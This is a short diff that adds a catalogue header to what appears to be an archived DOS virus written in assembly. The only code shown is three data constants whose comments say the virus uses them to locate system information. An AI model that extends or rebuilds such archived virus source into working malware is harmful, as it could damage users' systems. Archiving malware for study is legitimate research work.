@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 DATA_1E          EQU     4CH           ; Just a Few Data Segments that are
 DATA_3E          EQU     84H           ; Needed for the virus to find some
 DATA_5E          EQU     90H           ; hard core info...
